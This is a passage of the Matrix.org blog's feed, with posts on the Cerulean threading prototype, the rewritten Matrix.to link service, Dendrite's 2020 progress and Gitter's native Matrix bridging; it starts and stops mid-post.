&lt;li&gt;Search (again, just needs to be implemented in Dendrite - although how do you search beyond the data in your current homeserver? Folks are used to global search)&lt;&#x2F;li&gt;
&lt;li&gt;Hashtags (it’s just search, basically)&lt;&#x2F;li&gt;
&lt;li&gt;Symlinks (see below)&lt;&#x2F;li&gt;
&lt;li&gt;Figure out how to handle lost unthreaded messages (see below)&lt;&#x2F;li&gt;
&lt;li&gt;Offline support? (if we were using a proper Matrix SDK, we’d hopefully get this for free, but currently Cerulean doesn’t store any state locally at all).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;how-does-it-work&quot;&gt;How does it work?&lt;&#x2F;h3&gt;
&lt;p&gt;Every message you send using Cerulean goes into two Matrix rooms, dubbed the &amp;quot;timeline&amp;quot; room and the &amp;quot;thread&amp;quot; room. The &amp;quot;timeline&amp;quot; room (with an alias of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#@matthew:dendrite.matrix.org&quot;&gt;#@matthew:dendrite.matrix.org&lt;&#x2F;a&gt; or whatever your matrix id is) is a room with all of your posts and no one else&#x27;s. The &amp;quot;thread&amp;quot; room is a normal Matrix room which represents the message thread itself. Creating a new &amp;quot;Post&amp;quot; will create a new &amp;quot;thread&amp;quot; room. Replying to a post will join the existing &amp;quot;thread&amp;quot; room and send a message into that room. MSC2836 is used to handle threading of messages in the &amp;quot;thread” room - the replies refer to their parent via an m.relationship field in the event.&lt;&#x2F;p&gt;
&lt;p&gt;These semantics play nicely with existing Matrix clients, who will see one room per thread and a flattened chronological view of the thread itself (unless the client natively supports MSC2836, but none do yet apart from Cerulean). However, as Cerulean only navigates threaded messages with an m.reference relationship (eg it only ever uses the new &#x2F;event_relationships API rather than &#x2F;messages to pull in history), &lt;strong&gt;normal messages sent by Matrix into a thread or timeline room will not yet show up in Cerulean.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In this initial version, Cerulean literally posts the message twice into both rooms - but we’re also experimenting with the idea of adding “symlinks” to Matrix, letting the canonical version of the event be in the timeline room, and then the instance of the event in the thread room be a ‘symlink’ to the one in the timeline.  This means that the threading metadata could be structured in the thread room, and let the user do things like turn their timeline private (or vice versa) without impacting the threading metadata.  We could also add an API to both post to timeline and symlink into a thread in one fell swoop, rather than manually sending two events.  It’d look something like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-12-18-cerulean-diagram.png&quot; alt=&quot;Cerulean diagram&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We also experimented with cross-room threading (letting Bob’s timeline messages directly respond to Alice’s timeline messages and vice versa), but it posed some nasty problems - for instance, to find out what cross-room replies a message has, you’d need to store forward references somehow which the replier would need permission to create.  Also, if you didn’t have access to view the remote room, the thread would break. So we’ve punted cross-room threading to a later MSC for now.&lt;&#x2F;p&gt;
&lt;p&gt;Needless to say, once we’re happy with how threading works at the protocol level, we’ll be looking at getting it into the UX of Element and mainstream Matrix chat clients too!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-s-with-the-decentralised-reputation-button&quot;&gt;What’s with the decentralised reputation button?&lt;&#x2F;h3&gt;
&lt;p&gt;Cerulean is very much a test jig for new ideas (e.g. threading, timeline rooms, peeking), and we’re taking the opportunity to also use it as an experiment for our first forays into publishing and subscribing to reputation greylists; giving users the option to filter out content by default they might not want to see… but doing so on their own terms by subscribing to whatever reputation feed they prefer, while clearly visualising the filtering being applied.  In other words, this is the first concrete experimental implementation of the work proposed in the second half of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;19&#x2F;combating-abuse-in-matrix-without-backdoors&quot;&gt;Combating Abuse in Matrix without Backdoors&lt;&#x2F;a&gt;.  This is super early days, and we haven’t even published a proto-MSC for the event format being used, but if you’re particularly interested in this domain it’s easy enough to figure out - just head over to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#nsfw:dendrite.matrix.org&quot;&gt;#nsfw:dendrite.matrix.org&lt;&#x2F;a&gt; (warning: not actually NSFW, yet) and look in &#x2F;devtools to see what’s going on.&lt;&#x2F;p&gt;
&lt;p&gt;So, there you have it - further evidence that Matrix is not just for Chat, and a hopefully intriguing taste of the shape of things to come! Please check out the demo at &lt;a href=&quot;https:&#x2F;&#x2F;cerulean.matrix.org&quot;&gt;https:&#x2F;&#x2F;cerulean.matrix.org&lt;&#x2F;a&gt; or try playing with your own from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;cerulean&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;cerulean&lt;&#x2F;a&gt;, and then head over to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#cerulean:matrix.org&quot;&gt;#cerulean:matrix.org&lt;&#x2F;a&gt; and let us know what you think! :)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix.to: Reloaded</title>
        <published>2020-12-17T15:08:45+00:00</published>
        <updated>2020-12-17T14:11:52+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/12/17/matrix-to-reloaded/" type="text/html"/>
        <id>https://matrix.org/blog/2020/12/17/matrix-to-reloaded/</id>
        
        <content type="html">&lt;p&gt;One of the goals on the core team is to reduce friction for new users joining Matrix. A challenge we regularly face is all the factors which make Matrix flexible and powerful as an open, secure decentralised protocol also increase the difficulty of getting started.&lt;&#x2F;p&gt;
&lt;p&gt;As one example— to create a healthy, vibrant ecosystem and put power back into the hands of end users, it’s critical multiple clients exist, and that users ultimately have control over which one to use. However, needing to choose a client before getting going is counter-intuitive, and adds cognitive load which proprietary services simply don’t have.&lt;&#x2F;p&gt;
&lt;p&gt;Striking this balance is tricky, and one we’re aiming to improve with the latest version of &lt;a href=&quot;https:&#x2F;&#x2F;www.matrix.to&quot;&gt;Matrix.to&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-s-matrix-to&quot;&gt;What&#x27;s Matrix.to?&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix.to is a simple URL redirection service which lets users share links to rooms, users and communities. It isn’t tied to any client, and for end users it serves as a landing page for many as their first touch to Matrix. And until the matrix:&#x2F;&#x2F; URI scheme is deployed commonplace (we finally &lt;a href=&quot;https:&#x2F;&#x2F;www.iana.org&#x2F;assignments&#x2F;uri-schemes&#x2F;prov&#x2F;matrix&quot;&gt;registered it with IANA&lt;&#x2F;a&gt; a few months ago!) it is the only client-agnostic way to link to content in Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;It’s privacy preserving, with no information stored server side, with all calculation done in client-side JavaScript. It started life years ago as a temporary minimum viable hack by Matthew which then hung around untouched for years being… minimally viable. But we’ve recently given it a huge upgrade in usability and functionality at last!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-s-new&quot;&gt;What&#x27;s new?&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-12-17-matrix_to.png&quot; alt=&quot;The matrix.to room, on the new matrix.to!&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We’ve re-written matrix.to from scratch, giving it a visual upgrade and refocused the experience around:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Helping new users find the best client for them to easily get going.&lt;&#x2F;strong&gt; By default, links will prioritise showing clients which are compatible with the platform the link is being viewed from, including mobile platforms.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Optionally, remembering your preferred client for future visits.&lt;&#x2F;strong&gt; This also includes deeplinking into native apps for Element Desktop &amp;amp; Element Mobile (and in future, other clients too, of course).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Fetching useful previews.&lt;&#x2F;strong&gt; One of our main observations when testing with new users is a lack of confidence trying out a new service without personalised, contextual information on the rooms or people they’re heading to. Matrix.to now displays room metadata like avatars, names and topics directly (fetched via matrix.org by default, asking for permission).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;what-s-next&quot;&gt;What&#x27;s next?&lt;&#x2F;h2&gt;
&lt;p&gt;We’ve baked in the ability to specify clients and deployments within links, allowing sharing to give the option of a specific destination to guarantee a predictable experience. For instance, Mozilla might share matrix.to links which recommend using chat.mozilla.org, if you don’t already have a preferred Matrix client configured. We’ve yet to implement this feature in Element, but we’ll be researching and experimenting with different implementations soon and will recommend best practises when we have them.&lt;&#x2F;p&gt;
&lt;p&gt;We plan to evolve matrix.to over time, including eventually evolving it to better support the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2312&quot;&gt;Matrix URI scheme&lt;&#x2F;a&gt;. As before, you can find the source code &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.to&quot;&gt;on GitHub&lt;&#x2F;a&gt; and please go ahead and submit pull requests to get your Matrix client listed.&lt;&#x2F;p&gt;
&lt;p&gt;Let us know what you think over in the matrix.to room, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix.to:matrix.org&quot;&gt;linked to via matrix.to&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Dendrite 2020 Progress Update</title>
        <published>2020-12-15T00:00:00+00:00</published>
        <updated>2020-12-15T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/12/15/dendrite-2020-progress-update/" type="text/html"/>
        <id>https://matrix.org/blog/2020/12/15/dendrite-2020-progress-update/</id>
        
        <content type="html">&lt;p&gt;It&#x27;s been a year since Dendrite development picked up again and it&#x27;s certainly
been a busy one at that! We started off 2020 by sprinting to complete the FOSDEM P2P
demo and, since then, we have continued to develop Dendrite into a more featureful
and stable homeserver.&lt;&#x2F;p&gt;
&lt;p&gt;In October, we &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;08&#x2F;dendrite-is-entering-beta&quot;&gt;moved Dendrite into beta&lt;&#x2F;a&gt;,
and have since released a number of releases. We&#x27;ve also seen quite a lot of interest
from the community, so I&#x27;m here today to write about some of the fun things that have
been going on in Dendrite-land.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;announcing-dendrite-matrix-org&quot;&gt;Announcing dendrite.matrix.org&lt;&#x2F;h2&gt;
&lt;p&gt;I&#x27;m happy to announce that we&#x27;ve finally deployed our own public Dendrite instance at
&lt;strong&gt;dendrite.matrix.org&lt;&#x2F;strong&gt;! It&#x27;s running the latest Dendrite code and is open for
registration, so if you have been looking for an opportunity to play with Dendrite
without hosting your own deployment, here&#x27;s your chance!&lt;&#x2F;p&gt;
&lt;p&gt;There are still bugs and missing features, but overall the server is quite usable, so
please feel free to register and try it and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#dendrite:matrix.org&quot;&gt;let us know how you get on&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This is the first deployment that we&#x27;ve built for any kind of scale, so we are cautious
of the fact that there may be performance bottlenecks still. That said, over the last
few weeks, a number of performance-improving changes have been merged, including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Around 20x performance improvement on the State Resolution v2 algorithm, which is used
in room versions 2 and above&lt;&#x2F;li&gt;
&lt;li&gt;Significantly reducing the amount of time spent recalculating event reference hashes
and event IDs in the roomserver and sync API, reducing CPU usage&lt;&#x2F;li&gt;
&lt;li&gt;Optimised memory usage and reduced database hits in the federation sender, which helps
particularly in large rooms with lots of resident servers&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We&#x27;re optimistic that running this deployment will help us to identify scaling pain
points and to make Dendrite leaner in the long run. Feel free to sign up and give it
a spin! :-)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;features&quot;&gt;Features&lt;&#x2F;h2&gt;
&lt;p&gt;Since the beginning of the year, we&#x27;ve added a number of new features, including but
not limited to:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Room versions support for all currently specced versions (v1-v6), including support
for State Resolution v2&lt;&#x2F;li&gt;
&lt;li&gt;SQLite storage support in addition to PostgreSQL, largely useful for the P2P demos&lt;&#x2F;li&gt;
&lt;li&gt;Support for database schema upgrades, making updating Dendrite significantly easier&lt;&#x2F;li&gt;
&lt;li&gt;Early end-to-end encryption support, including device list syncing and send-to-device
messages, although with key backup and cross-signing still to come&lt;&#x2F;li&gt;
&lt;li&gt;A number of federation features, including invites, retries and backing off unreachable
homeservers&lt;&#x2F;li&gt;
&lt;li&gt;User-interactive authentication (UIA), which is used in password changes and deleting
devices from your device list&lt;&#x2F;li&gt;
&lt;li&gt;Support for local pagination, backfilling over federation and fetching missing events&lt;&#x2F;li&gt;
&lt;li&gt;Redaction of events both locally and over federation&lt;&#x2F;li&gt;
&lt;li&gt;Entirely new microservices for managing server signing keys, E2E keys, user and device
management&lt;&#x2F;li&gt;
&lt;li&gt;Lots of great contributions from the community - including all of Read Receipts (thanks to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;S7evinK&quot;&gt;S7evinK&lt;&#x2F;a&gt;) and Read Markers (thanks to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Lesterpig&quot;&gt;Lesterpig&lt;&#x2F;a&gt;)!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;...and of course &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;08&#x2F;dendrite-is-entering-beta&quot;&gt;entered Beta&lt;&#x2F;a&gt; in October!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;spec-compliance&quot;&gt;Spec compliance&lt;&#x2F;h2&gt;
&lt;p&gt;Of course, Dendrite also needs to be able to fulfill the promise of being a usable
next-generation Matrix homeserver at the same time as being a sci-fi development
platform. We have spent much of the last year working specifically on this. Today,
Dendrite&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sytest&quot;&gt;Sytest&lt;&#x2F;a&gt; compliance sits at:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;59%&lt;&#x2F;strong&gt; compliance for Client-Server APIs, up from 33% in May 2020&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;83%&lt;&#x2F;strong&gt; compliance for Server-Server APIs, up from 26% in May 2020&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;As you can see, these are significant leaps in the numbers of tests passing against
Dendrite. &lt;&#x2F;p&gt;
&lt;h2 id=&quot;experimental-mscs&quot;&gt;Experimental MSCs&lt;&#x2F;h2&gt;
&lt;p&gt;We have been increasingly trying to use Dendrite for the development and testing of
some new Matrix feature proposals. Recently we&#x27;ve seen early support added for
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2753&quot;&gt;Peeking (MSC2753)&lt;&#x2F;a&gt; and there
is work in progress on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2444&quot;&gt;Peeking over Federation (MSC2444)&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Peeking enables temporarily subscribing to a room for real-time events without joining
the room. This will only be possible with rooms that are world-readable, but it reduces
the overhead of looking into a room significantly as there is no need to update the room
state for each peeking user&#x2F;device.&lt;&#x2F;p&gt;
&lt;p&gt;In addition to that, we&#x27;ve also been working on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2836&quot;&gt;Threading (MSC2836)&lt;&#x2F;a&gt;
support, which is the gateway to building some pretty new and interesting Matrix
experiences. Twitter-like or Reddit-like social prototypes like this have traditionally
been difficult to build on top of Matrix as the &lt;code&gt;m.reference&lt;&#x2F;code&gt; relation type from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1849&quot;&gt;MSC1849&lt;&#x2F;a&gt;
had never really been fleshed out.&lt;&#x2F;p&gt;
&lt;p&gt;Threading adds &lt;code&gt;m.relationship&lt;&#x2F;code&gt; fields for embedding these relationships, and also
specifies an additional &lt;code&gt;&#x2F;event_relationships&lt;&#x2F;code&gt; API endpoint for finding other events
related to a given event in either direction. This makes it possible to build threads.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;p2p-matrix&quot;&gt;P2P Matrix&lt;&#x2F;h2&gt;
&lt;p&gt;Dendrite has also been our primary development platform for P2P Matrix. This year we
have released multiple P2P Matrix demos, including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;p2p.riot.im&quot;&gt;p2p.riot.im&lt;&#x2F;a&gt;, which uses libp2p rendezvous and embeds a full
Dendrite homeserver into an in-browser Service Worker&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;http:&#x2F;&#x2F;testflight.apple.com&#x2F;join&#x2F;Tgh2MEk6&quot;&gt;Element iOS P2P&lt;&#x2F;a&gt;, available on TestFlight,
which embeds a full Dendrite homeserver into the Element iOS app, initially using
QUIC over &lt;a href=&quot;https:&#x2F;&#x2F;yggdrasil-network.github.io&quot;&gt;Yggdrasil&lt;&#x2F;a&gt; as a transport for federation
traffic, but with more recent versions using QUIC over the experimental Pinecone protocol&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;tree&#x2F;master&#x2F;cmd&#x2F;dendrite-demo-libp2p&quot;&gt;dendrite-demo-libp2p&lt;&#x2F;a&gt;,
a standalone binary which formed the basis of the FOSDEM 2020 P2P demo, using libp2p and
local multicast discovery as a transport for federation traffic&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;tree&#x2F;master&#x2F;cmd&#x2F;dendrite-demo-yggdrasil&quot;&gt;dendrite-demo-yggdrasil&lt;&#x2F;a&gt;,
another standalone binary like above, but using QUIC over Yggdrasil connectivity instead
of libp2p as the transport for federation traffic&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Each experiment teaches us more about potential issues that need to be resolved in order
to bring P2P Matrix closer to being reality, and we are continuing to use Dendrite for
this work. We&#x27;ll be announcing more information in the New Year about our latest efforts
and the Pinecone routing scheme that we are developing.&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s also worth highlighting that all of the other experimental work taking place right
now, including Threading and Peeking, also work over P2P!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-s-next&quot;&gt;What&#x27;s next&lt;&#x2F;h2&gt;
&lt;p&gt;We&#x27;ll be taking a short break for Christmas, but will then be continuing work on
Dendrite in 2021, with the main aims being to add new features, improve spec compliance
further, fix bugs and eventually exit beta. We&#x27;ll also be continuing further experimental work in the
P2P and Threading areas, as well as supporting the development of new MSCs such as
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2787&quot;&gt;Portable Identities (MSC2787)&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d like to say thank you for the community support and interest, and also to send
out a special thanks to our community contributors who have contributed a number of
fixes and features in recent months! We always welcome code contributions via
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&quot;&gt;GitHub&lt;&#x2F;a&gt; if you are an interested developer.&lt;&#x2F;p&gt;
&lt;p&gt;As always, stay tuned for more Dendrite updates either by joining us in
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#dendrite:matrix.org&quot;&gt;#dendrite:matrix.org&lt;&#x2F;a&gt; or by getting your
regular dose of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&quot;&gt;This Week in Matrix&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;— Neil Alexander and Kegan&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Gitter now speaks Matrix!</title>
        <published>2020-12-07T00:00:00+00:00</published>
        <updated>2020-12-07T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/12/07/gitter-now-speaks-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2020/12/07/gitter-now-speaks-matrix/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;It’s been just over 2 months since we revealed that &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;09&#x2F;30&#x2F;welcoming-gitter-to-matrix&quot;&gt;Gitter was going to join Matrix&lt;&#x2F;a&gt; - and
we are incredibly proud to announce that Gitter has officially turned on true native Matrix connectivity:
&lt;strong&gt;all public Gitter rooms are now available natively via Matrix, and all Gitter users now natively exist on Matrix.&lt;&#x2F;strong&gt;
So, if you wanted to join the official Node.js language support room at &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;nodejs&#x2F;node&quot;&gt;https:&#x2F;&#x2F;gitter.im&#x2F;nodejs&#x2F;node&lt;&#x2F;a&gt;
from Matrix, just head over to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#nodejs_node:gitter.im&quot;&gt;#nodejs_node:gitter.im&lt;&#x2F;a&gt; and *boom*, you’re in!&lt;&#x2F;p&gt;
&lt;p&gt;This means Gitter is now running a Matrix homeserver at gitter.im which exposes all the active public rooms - so if you go to the the room directory in Element (for instance) and select gitter.im as a homeserver, you can jump straight in:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-12-07-gitter-roomdir.png&quot; alt=&quot;Gitter room directory&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Once you’re in, you can chat back and forth transparently between users on the Gitter side and the Matrix side, and you no longer have the ugly “Matrixbot” user faking the messages back and forth - these are ‘real’ users talking directly to one another, and every public msg in every public room is now automatically exposed into Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-12-07-gitter-matrix.gif&quot; alt=&quot;Gitter and Matrix going native!&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, suddenly all the developer communities previously living only in Gitter (&lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;scala&quot;&gt;Scala&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;nodejs&#x2F;home&quot;&gt;Node&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;webpack&quot;&gt;Webpack&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;angular&quot;&gt;Angular&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;rails&quot;&gt;Rails&lt;&#x2F;a&gt; and thousands of others) are now available to anyone anywhere on Matrix - alongside communities bridged from Freenode and Slack; the native Matrix communities for Mozilla, KDE, GNOME communities etc. We’re hopeful that glueing everything together via Matrix will usher in a new age of open and defragmented dev collaboration, a bit like we used to have on IRC, back in the day.&lt;&#x2F;p&gt;
&lt;p&gt;This is also great news for mobile Gitter users - as the original mobile Gitter clients have been in a &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;gitlab-org&#x2F;gitter&#x2F;webapp&#x2F;-&#x2F;issues&#x2F;2281&quot;&gt;holding pattern for over a year&lt;&#x2F;a&gt;, and native Matrix support for Gitter means they are now officially deprecated in favour of Element (or indeed any other mobile Matrix client).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-features-are-ready&quot;&gt;What features are ready?&lt;&#x2F;h2&gt;
&lt;p&gt;Now, this is the first cut of native Matrix support in Gitter: much of the time since Gitter joined Element has been spent migrating stuff over from Gitlab to Element, and it’s only really been a month of work so far in hooking up Matrix. As a result: all the important features work, but there’s also stuff that’s yet to land:&lt;&#x2F;p&gt;
&lt;p&gt;Features ready today:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ability to join rooms from Matrix via #org_repo:gitter.im&lt;&#x2F;li&gt;
&lt;li&gt;Bridging Edits, Replies (mapped to Threads on Gitter), Deletes, File transfer&lt;&#x2F;li&gt;
&lt;li&gt;Bridging Markdown &amp;amp; Emoji&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;What remains:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ability to send&#x2F;receive Direct Messages&lt;&#x2F;li&gt;
&lt;li&gt;Ability to plumb existing Matrix rooms into Gitter natively&lt;&#x2F;li&gt;
&lt;li&gt;Ability to view past Gitter history from Matrix. This is planned thanks to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2716&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2716&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Synchronising the full Gitter membership list to Matrix. Currently the membership syncs incrementally as people speak&lt;&#x2F;li&gt;
&lt;li&gt;Turning off the old Gitter bridge&lt;&#x2F;li&gt;
&lt;li&gt;Bridging emotes (&#x2F;me support) (almost landed!)&lt;&#x2F;li&gt;
&lt;li&gt;Bridging read receipts&lt;&#x2F;li&gt;
&lt;li&gt;Synchronising room avatars&lt;&#x2F;li&gt;
&lt;li&gt;Bridge LaTeX&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Stuff we’re not planning to support:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ability to join arbitrary rooms on Matrix from Gitter. This could consume huge resources on Gitter, and we’re not in a rush to mirror all of Matrix into Gitter. This will get addressed when Gitter merges with Element into a pure Matrix client.&lt;&#x2F;li&gt;
&lt;li&gt;Bridging Reactions. Gitter doesn’t have these natively today, and rather than adding them to Gitter, we’d rather work on merging Gitter &amp;amp; Element together.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;For more details, we strongly recommend checking out the &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;groups&#x2F;gitterHQ&#x2F;-&#x2F;epics&#x2F;10&quot;&gt;native Matrix epic on Gitlab&lt;&#x2F;a&gt; for the unvarnished truth straight from the coal-face!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;how-do-you-make-an-existing-chat-system-talk-matrix&quot;&gt;How do you make an existing chat system talk Matrix?&lt;&#x2F;h2&gt;
&lt;p&gt;In terms of the work which has gone into this - Gitter has been an excellent case study of how you can easily plug an existing large established chat system into Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;At high level, the core work needed was as simple as:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Add ‘virtual users’, so remote Matrix users can be modelled and represented in Gitter correctly: &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;gitterHQ&#x2F;webapp&#x2F;-&#x2F;merge_requests&#x2F;2027&#x2F;diffs&quot;&gt;https:&#x2F;&#x2F;gitlab.com&#x2F;gitterHQ&#x2F;webapp&#x2F;-&#x2F;merge_requests&#x2F;2027&#x2F;diffs&lt;&#x2F;a&gt;.
&lt;ul&gt;
&lt;li&gt;This can be accomplished by simply adding a &lt;code&gt;virtualUser&lt;&#x2F;code&gt; property to your chat message&#x2F;post&#x2F;tweet schema which holds the mxid, displayName, and avatar as an alternative to your &lt;code&gt;author&lt;&#x2F;code&gt; field. Then display the &lt;code&gt;virtualUser&lt;&#x2F;code&gt; whenever available over the &lt;code&gt;author&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Add an application service to Gitter to bridge traffic in &amp;amp; out of Matrix: &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;gitterHQ&#x2F;webapp&#x2F;-&#x2F;merge_requests&#x2F;2041&#x2F;diffs&quot;&gt;https:&#x2F;&#x2F;gitlab.com&#x2F;gitterHQ&#x2F;webapp&#x2F;-&#x2F;merge_requests&#x2F;2041&#x2F;diffs&lt;&#x2F;a&gt;
&lt;ul&gt;
